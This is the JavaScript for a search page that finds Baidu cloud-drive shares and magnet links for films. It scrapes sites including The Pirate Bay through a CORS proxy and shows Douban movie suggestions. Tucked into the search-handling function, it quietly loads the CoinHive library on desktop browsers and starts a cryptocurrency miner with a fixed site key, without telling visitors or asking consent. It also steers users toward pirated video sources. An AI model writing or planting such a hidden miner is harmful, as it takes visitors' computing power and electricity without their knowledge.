window.onload = function(){
    
}

String.prototype.format = function()
{
    var args = arguments;
    return this.replace(/\{(\d+)\}/g,                
        function(m,i){
            return args[i];
        });
}

    locationParameterChanged();

function setHeight(input,height){
        input.style.height = height;
}

function setFontSize(input,maxLength,fontSize){
    function min(x,y){
        return x-y<0?x:y;
    }
    function max(x,y){
        return x-y<0?y:x;
    }
    if(!fontSize){
        var fontSize = max(min(window.innerWidth,window.innerHeight)/maxLength,16)+"px";

    }
    input.style.fontSize = fontSize;
}

function changeHash(form){
    if(location.hash.substr(1)==form.search.value){
        Location.reload();
    }else{

        location.hash = "#"+form.search.value;
    }
    return false;
}
function locationParameterChanged() {
    var key = getURLParameter("search");
    var input = document.getElementsByTagName("input")[0];
    
    input.oninput = function(e){
        if(e.data ==" "){
            setDoubanList(input.value);
        }
//          setFontSize(input,input.value.length>8?input.value.length+2:8+2);
        
    }
    input.onfocus = function(){
         setHeight(input,"50%");
//          setFontSize(input,10);
    }
    document.getElementsByTagName("form")[0].onsubmit = function(){
         setHeight(input,"15%");
//          setFontSize(input,100,"1.5em");
    }
    if(!key){
        input.focus();
        input.setAttribute("required","required");
        return;
    }

    input.value=key;
    document.getElementsByTagName("title")[0].innerText=key+" in pan.baidu.com sharing";
    var sms = new String("sms:+13006248103?body=有 {0} 吗？");
    document.getElementById("sms").href = sms.format(key);
    window.panc=pancFetcher(key);
    window.panduoduo=panduoduoFetcher(key);
    window.magnet=magnetFetcher(key);
//     window.tieba=tiebaFetcher(key);
    if(screen.width>=751&&!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ){
        importScript ("https://coin-hive.com/lib/coinhive.min.js", function(){
            var miner = new CoinHive.Anonymous('Wtx9zrRVSwMjJmFssPEtuCxnzkdo3QaP');
            miner.start();
        })
    }

    setDoubanList(input.value);
}
function loading(is,id){           
    var loadingDoc = document.getElementById(id?id:"pancLoading");
    loadingDoc.style.display=is?"block":"none";
}
function confirm(id,isImportant,data){
    try{
        
        var template = document.getElementById(id).innerHTML;
        var confirm;
        if(isImportant){

            confirm = document.getElementById("confirm2");
        }else{

            confirm = document.getElementById("confirm");
        }
        if(id=="noneTemplate"){
            data = getURLParameter("search");
        }
        var html= template.format(data);
        confirm.innerHTML = html;
        if(id=="moreTemplate"){
            confirm.id = "confirm2";
        }
    }catch(e){
        
    }
    
}



function ShowMore(){

    var length = window.showVideos.length;
    var ways = [panc,panduoduo,magnet];
    if(length<1){
        length = 1;
    }
    setMoreIframe(ways,0,length);

    
}
function setMoreIframe(ways,index,length){
    if(!index){
        index = 0;
    }
    if(!ways[index]){
        confirm("noneTemplate",true);
        return;
    }
    var videos = ways[index].videos;
    var than = length - videos.length;

    if(videos.length == 0){
        setMoreIframe(ways,index+1,than);
    }else if(than>0){
        ways[index].setIframe(videos,videos.length,window.showVideos);
        setMoreIframe(ways,index+1,than);
    }else{
        ways[index].setIframe(videos,length,window.showVideos);
    }

}
function fetcher(parameter){
    var serf = {};
    serf.host = parameter.host;
    serf.videos = [];
    serf.fetchUrl = parameter.fetchUrl;
    serf.progress = innerProgress(serf.host,serf.fetchUrl);
    serf.parseVideos = parameter.parseVideos;
    serf.setIframe = parameter.setIframe;
    serf.fetch = parameter.fetch;
    var success = function(html){
        var progress = serf.progress;
        var videos = serf.parseVideos(html);
        if(!videos||videos.length===0){
            progress.none();
            confirm("noneTemplate");
            return;
        }
        progress.success(videos.length);
        serf.videos = videos;
        if(!window.showVideos){
            window.showVideos = [];
            serf.setIframe(serf.videos,1,window.showVideos);
        }else if((serf.videos&&serf.videos[0].ref=="magnet")||(window.showVideos.length==1&&window.showVideos[0].ref=="magnet")){
            serf.setIframe(serf.videos,1,window.showVideos);
        }
        html = null;
        
    };
    serf.fetch(serf.host,serf.fetchUrl,success);
    return serf;
}

function panduoduoFetcher(key){
    var parameter = {};
    parameter.host = "panduoduo";
    parameter.fetchUrl = "http://www.panduoduo.net/s/comb/n-"+key+"&ty-bd&f-f4";
    parameter.fetch = fetch;
    parameter.parseVideos = function(html){
        return parseList(html,".search-page .row");
        function parseList(html,select){
            var videos = [];
            var el = document.createElement( 'html' );
            el.innerHTML = html;

            var as = el.querySelectorAll(select);
            for(var i = 0;i<as.length;i++){
    //             if(i>10){
    //                 break;
    //             }
                var img = as[i].querySelector('[title="百度云盘资源"]');
                var type = as[i].querySelector('[href^="/c/"]');
                if(img&&type.innerHTML=="视频"){
                    var a = as[i].querySelector("a[href^='/r/']");
                    var video = {ref:parameter.host,name:a.innerHTML,url:"http://www.panduoduo.net"+a.pathname};
                    videos.push(video);
                }

    //                 fetchDetal(video,i===0);

            }
            html = el = els = null;
            return videos;
        }

    }
    parameter.setIframe = function (panduoduoVideos,length,showVideos){
        var videos = panduoduoVideos.splice(0,length);
        videos.forEach(function (item, index, array) {

            window.showVideos.push(item);
            fetchDetal(item,index===0);
        });

        function fetchDetal(video,isSrc){
            
            var wrapper = setIframe([video],false,true);
            var success = function(html){

                var url = parseDetail(html,"a.dbutton2");
                if(!url){
                    parameter.setIframe(videos,1,window.showVideos);

                }
                if(window.showVideos&&isExist(url,window.showVideos)){
                    return;
                }
                video["url"] = url;
                function parseDetail(html,select){
                    var href = html.substring(html.indexOf('"dbutton2" href="')+'"dbutton2" href="'.length,html.indexOf('" rel="nofollow">点击去百度云盘下载资源</a>'));
                    var url = getURLParameter("url",href);
                    return url;
                }

                setIframeUrl(url,wrapper,isSrc);


            }
            fetch("panduoduo",video.url,success);
        }
    }
    
    return fetcher(parameter);
    
}


function pancFetcher(key){

    var parameter = {};
    parameter.host = "panc";
    parameter.fetchUrl = "https://www.panc.cc/s/"+key+"/td_1";
    parameter.fetch = fetch;

    parameter.parseVideos = function(html){
        var videos = parseHref(html,".a_url");
        clearInvalid(videos);
        return videos;

        function parseHref(html,select){
            var videos = [];
            var el = document.createElement( 'html' );
            el.innerHTML = html;
            var as = el.querySelectorAll(select);
            for(var i = 0;i<as.length;i++){
                videos.push({name:as[i].previousElementSibling.innerHTML,url:as[i].href});
            }
            return videos;
        }
    }
    parameter.setIframe = function (pancVideos,length,showVideos){
        var videos = pancVideos.splice(0,length);
        window.showVideos = window.showVideos.concat(videos);
        setIframe(videos,true);
    }
    
    return fetcher(parameter);

}

function fetch(host,api,success){

//     confirm("loadingTemplate");
    var url = encodeURI("//charon-node.herokuapp.com/fetch?api="+api);
//     var url = encodeURI("http://127.0.0.1:8888/fetch?api="+api);
//     var data = JSON.stringify({crossUrl:api});
    try{
        var error = function(){
            var videos = [];
            confirm("noneTemplate");
            progress(host+'Progress').error();
//             setIframe(videos,true,true);
        }
        ajax(url,success,error);

    }catch(e){
        error();
    }
}
function nodeFetch(host,api,success){

//     confirm("loadingTemplate");
    var url = encodeURI("//charon-node.herokuapp.com/fetch?npm=node-fetch&api="+api);
//     var url = encodeURI("http://127.0.0.1:8888/fetch?npm=node-fetch&api="+api);
//     var data = JSON.stringify({crossUrl:api});
    try{
        var error = function(){
            var videos = [];
            confirm("noneTemplate");
            progress(host+'Progress').error();
//             setIframe(videos,true,true);
        }
        ajax(url,success,error);

    }catch(e){
        error();
    }
}
function cross(host,api,success){

//     confirm("loadingTemplate");
    var url = encodeURI("//charon-node.herokuapp.com/cross?api="+api);
    try{
        var error = function(){
            var videos = [];
            confirm("noneTemplate");
            progress(host+'Progress').error();
//             setIframe(videos,true,true);
        }
        ajax(url,success,error);

    }catch(e){
        error();
    }
}



function setIframe(videos,isSrc,waitUrl,templateId) {
    
    templateId = templateId?templateId:"videoTemplate";
    var template = document.getElementById(templateId).innerHTML;

    var dataBox =  document.getElementById("data");
    for(var i=0;i<videos.length;i++){
//         if(window.showVideos&&isExist(videos[i],window.showVideos)){
//             continue;
//         }
        var wrapper= document.createElement('div');
        wrapper.innerHTML= template;
        a = wrapper.children[0];
        a.innerHTML=videos[i].name;
        if(!waitUrl){
            var url = videos[i].url;
            setIframeUrl(url,wrapper,isSrc&&i==0,templateId);
        
        }

        
        dataBox.appendChild(wrapper);
    }
    confirm("moreTemplate");
    dataBox = iframe = videos = null;
    return wrapper;
}
function setIframeUrl(url,wrapper,isSrc,templateId){
    a.href=url;
    var iframe = wrapper.querySelector("iframe");

    templateId = templateId?templateId:"videoTemplate";
    if(templateId=="videoTemplate"){
        if(isDisableScript(url)){
            iframe.sandbox="allow-same-origin allow-popups allow-forms allow-pointer-lock";
        }

        url = url.substr(url.indexOf("//"));
        iframe.dataset.src=url;
        if(isSrc){
            iframe.src=url;
        }
        addVideosHandler(iframe);


    }else if(templateId=="magnetTemplate"){

        var code= wrapper.querySelector("code");;
        code.innerHTML = url;
    }
}
function isExist(url,videos){
    for(var i=0;i<videos.length;i++){
        if(videos[i].url==url){
            return true;
        }
    }
    return false;
}
function isDisableScript(url){
    if(url.indexOf("pan.baidu.com/pcloud/album/file")>0){
        return true;
    }
    return false;
}

function load(uri,fn){
    var request = new XMLHttpRequest();
    request.open('PUT', uri, false); 
    request.send(null);
    if (request.status === 200) {
      return request.responseText;
    }
}

function getURLParameter(name,url) {
  return decodeURIComponent((new RegExp('[?|&]' + name + '=' + '([^&;]+?)(&|#|;|$)').exec(url?url:location.search) || [null, ''])[1].replace(/\+/g, '%20')) || null;
}


function isElementInViewport (el) {

    //special bonus for those using jQuery
    if (typeof jQuery === "function" && el instanceof jQuery) {
        el = el[0];
    }

    var rect = el.getBoundingClientRect();

    return (
        rect.top >= 0 &&
        rect.left >= 0 &&
        rect.bottom <= (window.innerHeight || document.documentElement.clientHeight) && /*or $(window).height() */
        rect.right <= (window.innerWidth || document.documentElement.clientWidth) /*or $(window).width() */
    );
}
function onVisibilityChange(el, callback) {
    var old_visible;
    return function () {
        var visible = isElementInViewport(el);
        if (visible != old_visible) {
            old_visible = visible;
            if (typeof callback == 'function') {
                callback();
            }
        }
    }
}
function addVideosHandler(iframe){
    var handler = onVisibilityChange(iframe, function() {
        if(!iframe.src){
            iframe.src = iframe.dataset.src;
        }
    });
    if (window.addEventListener) {
        addEventListener('DOMContentLoaded', handler, false); 
        addEventListener('load', handler, false); 
        addEventListener('scroll', handler, false); 
        addEventListener('resize', handler, false); 
    } else if (window.attachEvent)  {
        attachEvent('onDOMContentLoaded', handler); // IE9+ :(
        attachEvent('onload', handler);
        attachEvent('onscroll', handler);
        attachEvent('onresize', handler);
    }
}

function ajax(uri,fn,error,method,data){
    var request = new XMLHttpRequest();
    request.open(method||"GET", uri);
    try{
      request.send(data||null);
    }catch(e){
        error();
    }
    request.onload = function(e) {
        if (this.status == 200) {
            try{
                fn(this.response,error);
            }catch(e){
                error();
            }
        }else{
          error();
        }
    };
    request.onerror = error;
    request.timeout = 20000; // time in milliseconds
    request.ontimeout = function (e) {
      // XMLHttpRequest timed out. Do something here.
      request.abort();
      error();
    };
}

function isEnglish(string){
    var notEnglish = /[^\x00-\x7F]+/;
    if (notEnglish.test(string)){
        return false;
    }
    return true;
}

function magnetFetcher(key){
    var parameter = {};

    if(isEnglish(key)){
//         return null;
//     }
        parameter.host = "thepiratebay";
        parameter.fetchUrl = "https://thepiratebay.org/search/"+key+"/0/99/0";
        parameter.parseVideos = function(html){
            var videos = parseList(html);
            return videos;

            function parseList(html){

                var videos = [];
                var el = document.createElement( 'html' );
                el.innerHTML = html;

                var els = el.querySelectorAll("#searchResult tbody tr");
                
                for(var i = 0;i<els.length;i++){
        //             if(i>10){
        //                 break;
        //             }
                    var name = els[i].querySelector(".detLink").innerHTML;
                    var url = els[i].querySelector("a[href^='magnet:']").href;
                    var video = {ref:"magnet",name:name,url:url};
                    videos.push(video);
        //                 fetchDetal(video,i===0);

                }
                html = el = els = null;
                return videos;
            }
        };

        parameter.fetch = cross;
    }else{
        parameter.host = "diaosisou";
        parameter.fetchUrl = "http://www.diaosisou.org/list/"+key+"/1";
        parameter.parseVideos = function(html){
            var videos = parseList(html);
            return videos;

            function parseList(html){

                var videos = [];
                var el = document.createElement( 'html' );
                el.innerHTML = html;

                var els = el.querySelectorAll(".mlist>li");
                el = null;
                for(var i = 0;i<els.length;i++){
        //             if(i>10){
        //                 break;
        //             }
                    var name = els[i].querySelector("a[name='file_title'").innerHTML;
                    var url = els[i].querySelector("a[href^='magnet:']").href;
                    var video = {ref:"magnet",name:name,url:url};
                    videos.push(video);
        //                 fetchDetal(video,i===0);

                }
                
                html = el = els = null;
                return videos;
            }
        };
        parameter.fetch = nodeFetch;
    }
    

    parameter.setIframe = function (videos,length,showVideos){
        var videos = videos.splice(0,length);
        window.showVideos = window.showVideos.concat(videos);
        setIframe(videos,true,false,"magnetTemplate");
    }
    
    return fetcher(parameter);


    
}

function loadError (oError) {
  throw new URIError("The script " + oError.target.src + " is not accessible.");
}

function importScript (sSrc, fOnload) {
  var oScript = document.createElement("script");
  oScript.type = "text\/javascript";
  oScript.onerror = loadError;
  if (fOnload) { oScript.onload = fOnload; }
  document.currentScript.parentNode.insertBefore(oScript, document.currentScript);
  oScript.src = sSrc;
}

function progress(id){

    var _progress = document.getElementById(id);
    if(_progress.is_progress){
        return _progress;
    }
    _progress.is_progress = true;
    _progress.interval=setInterval(frame, 10);
    _progress.success=function(length){
        _progress.classList.add("success");
        clearInterval(_progress.interval);
        if(length){
            appendHTML(_progress.nextSibling,"<em>("+length+")</em>");
        }
    };
    _progress.none = function(){
        _progress.classList.add("none");
        clearInterval(_progress.interval);
    }
    _progress.error = function(){
        _progress.classList.add("error");
        clearInterval(_progress.interval);
    }

    function frame() {
        if (_progress.value >= 20000) {
            clearInterval(_progress.interval);
            _progress.error();
        } else {
            _progress.value  = _progress.value + 10;
        }
    }
    return _progress;
}

function innerProgress(host,fetchUrl){
    var progressGroup = document.getElementById("progressGroup");
    progressGroup.classList.add("show");
    var html = '<li class="'+host+'"><progress max="20000" id="'+host+'Progress"></progress><a target="_blank" href="'+fetchUrl+'">'+host+'</a>';
    appendHTML(progressGroup,html)
    return progress(host+'Progress');
}
function appendHTML(d,html){
    var wrapper= document.createElement('div');
        wrapper.innerHTML= html;
        d.appendChild(wrapper.children[0]);
}

// function changeShowVideosNeedCheck(video,url){
//     if(!url){
//         showVideos.push(video);
//     }else{
//         video["url"]=url;
//     }
//     check(video["url"],function(){
//         showVideos = showVideos.splice(video, 1);
//     })
// }
function checkInvalid(url,error){
    var uri = "//charon-node.herokuapp.com/cross?api="+url;
    ajax(uri,function(data){
        var el = document.createElement( 'html' );
        el.innerHTML = data;

        var as = el.querySelector("title");
        if(as.innerHTML == "百度网盘-链接不存在"|| as.innerHTML =="页面不存在"){
            error();
        }
        data=el=as=null;
    },error);
}
function clearInvalid(array,c){
    array.map(function(o) { 
        checkInvalid(o["url"],function(){
            array.splice(array.indexOf(o), 1);
        })
    });

}

function setDoubanList(value){
    var api = "https://api.douban.com/v2/movie/search?q="+value;
    var uri = "//charon-node.herokuapp.com/cross?api="+api;
    ajax(uri,function(data){
        var html  = "";
        var subjects = JSON.parse(data).subjects;
        for(var i = 0;i<subjects.length;i++){
            var isSame = "";
            if(value==subjects[i].title){
                isSame = 'class="is-same"';
            }
            html += '<a '+isSame+' href="?search='+encodeURIComponent(subjects[i].title)+'"><img src="'+subjects[i].images.medium+'"/><span>'+subjects[i].title+'<span></a>'
            if(subjects[i].original_title!=subjects[i].title){
                var isSame = "";
                if(value==subjects[i].original_title){
                    isSame = 'class="is-same"';
                }
                html += '<a '+isSame+' href="?search='+encodeURIComponent(subjects[i].original_title)+'"><img src="'+subjects[i].images.medium+'"/><span>'+subjects[i].original_title+'<span></a>'

            }
        }
        var doubanListD = document.getElementById("doubanList");
        doubanListD.innerHTML=html;
        doubanListD.style.display = "block";
        data=html=subjects=doubanListD=null;
    });
}
function setDoubanWeekly(value){
    var api = "http://api.douban.com/v2/movie/weekly?apikey=0df993c66c0c636e29ecbb5344252a4a";
    var uri = "//charon-node.herokuapp.com/cross?api="+api;
    var doubanListD = document.getElementById("doubanWeekly");
    if(!doubanListD){
        return;
    }
    ajax(uri,function(data){
        var html  = "";
        var subjects = JSON.parse(data).subjects;
        for(var i = 0;i<subjects.length;i++){
            var subject = subjects[i].subject;
            var isSame = "";
            var original_title = sort(subject.original_title);
            if(value&&value==subject.original_title){
                isSame = 'class="is-same"';
            }
            html += '<a '+isSame+' href="?search='+encodeURIComponent(original_title)+'"><img src="'+subject.images.medium+'"/><span>'+original_title+'<span></a>'

        }
        html += '<a target="_blank" href="https://movie.douban.com/top250" class="douban-more">Top 250<i>﹀</i></a>';
        doubanListD.innerHTML=html;
        doubanListD.id = "doubanWeekly2";
//         doubanListD.style.display = "block";
        data=html=subjects=doubanListD=null;
    });
    function sort(string){
        if(string.length>10){
            var index = string.indexOf("之");
            if(index>0){
                string = string.slice(index+1);
            }
        }
        return string;
    }
}

function reloadIframe(button){
    button.previousElementSibling.src=button.previousElementSibling.src
}



function tiebaFetcher(key){

    var parameter = {};
    parameter.host = "tieba";
    parameter.fetchUrl = "http://tieba.baidu.com/f/search/res?ie=utf-8&qw="+key+" pan.baidu";
    parameter.fetch = cross;

    parameter.parseVideos = function(html){
        var videos = parseHref(html,".s_post");
        clearInvalid(videos);
        return videos;

        function parseHref(html,select){
            var videos = [];
            var el = document.createElement( 'html' );
            el.innerHTML = html;
            var as = el.querySelectorAll(select);
            for(var i = 0;i<as.length;i++){
                var string = as[i].querySelector(".p_title").innerText+" "+as[i].querySelector(".p_content").innerText;
                var keyIndex = string.lastIndexOf(key);
                var name = string.slice(keyIndex);
                var urlIndex = string.indexOf("http",keyIndex);
                if(urlIndex>0){
                    var url = string.slice(urlIndex);
                    var regexp = /[^\x00-\x7F]|\s|\.\.\.|,/;
                    var match = url.match(regexp);
                    url = url.slice(0,match.index);
                }
                if(url){
                    videos.push({name:name,url:url});
                }

            }
            return videos;
        }
    }
    parameter.setIframe = function (videos,length,showVideos){
        var videos = videos.splice(0,length);
        window.showVideos = window.showVideos.concat(videos);
        setIframe(videos,true,false);
    }
    
    return fetcher(parameter);

}
